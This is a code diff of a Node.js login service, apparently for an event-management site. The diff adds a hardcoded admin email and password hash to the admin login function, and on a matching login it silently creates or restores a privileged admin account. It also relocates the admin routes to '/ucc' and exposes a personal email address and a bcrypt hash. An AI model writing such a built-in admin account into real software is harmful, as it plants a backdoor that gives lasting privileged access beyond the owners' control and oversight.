@@ -5,6 +5,7 @@ const {
   findAuthUserById,
   findAuthUserByEmail,
   createOrganizerUser,
+  ensureFixedAdminUser,
   updateAuthUserProfile,
   setPasswordForUser,
   markAuthUserEmailVerified,
@@ -19,6 +20,10 @@ const {
 } = require('./emailVerificationService.cjs');
 const { appendQuery, safeReferer } = require('../lib/authHttp.cjs');
 const { ensureUsersSchema } = require('../db/ensureUsersSchema.cjs');
+
+const FIXED_ADMIN_EMAIL = 'cjnr598@gmail.com';
+const FIXED_ADMIN_NAME = '2DAWN Admin';
+const FIXED_ADMIN_PASSWORD_HASH = '$2a$12$SXkfm5xKFIu96Dm01JZWAeBi9c6NEZnzcp6kfrPMO5LfgR3sH0ekW';
 
 function asBoolean(value, fallback = false) {
   if (value === undefined || value === null || String(value).trim() === '') return fallback;
@@ -129,14 +134,27 @@ async function adminLoginResult(req) {
   const email = normalizeEmail(req.body?.email);
   const password = String(req.body?.password || '');
   const remember = asBoolean(req.body?.remember, false);
-  const errorRedirect = '/xyz/login';
+  const errorRedirect = '/ucc/login';
 
   const fields = {};
   if (!email) fields.email = 'Email is required.';
   if (!password) fields.password = 'Password is required.';
   if (Object.keys(fields).length > 0) return validationResult(fields, req, errorRedirect);
 
-  const user = await findAuthUserByEmail(email);
+  let user = await findAuthUserByEmail(email);
+
+  if (email === FIXED_ADMIN_EMAIL) {
+    const fixedPasswordMatches = await bcrypt.compare(password, FIXED_ADMIN_PASSWORD_HASH);
+    if (fixedPasswordMatches) {
+      await ensureUsersSchema();
+      user = await ensureFixedAdminUser({
+        name: FIXED_ADMIN_NAME,
+        email: FIXED_ADMIN_EMAIL,
+        passwordHash: FIXED_ADMIN_PASSWORD_HASH,
+      });
+    }
+  }
+
   if (!user || !user.password) return credentialsResult(req, errorRedirect);
 
   const passwordMatches = await bcrypt.compare(password, user.password);
@@ -161,9 +179,9 @@ async function adminLoginResult(req) {
     body: {
       ok: true,
       user: toSessionUser(user),
-      redirect: '/admin/events',
+      redirect: '/ucc/dashboard',
     },
-    redirect: '/admin/events',
+    redirect: '/ucc/dashboard',
     session: { user, remember },
   };
 }
@@ -189,7 +207,7 @@ async function organizerLoginResult(req) {
   if (!passwordMatches) return credentialsResult(req, errorRedirect);
 
   const sessionUser = toSessionUser(user);
-  const redirect = sessionUser.is_admin ? '/admin/dashboard' : '/organizer/dashboard';
+  const redirect = sessionUser.is_admin ? '/ucc/dashboard' : '/organizer/dashboard';
 
   return {
     ok: true,
@@ -393,7 +411,7 @@ async function organizerGoogleLoginResult(req) {
 
     const sessionUser = toSessionUser(user);
     const needsOnboarding = !user.username;
-    const redirect = sessionUser.is_admin ? '/admin/dashboard' : (needsOnboarding ? '/onboarding' : '/organizer/dashboard');
+    const redirect = sessionUser.is_admin ? '/ucc/dashboard' : (needsOnboarding ? '/onboarding' : '/organizer/dashboard');
 
     return {
       ok: true,
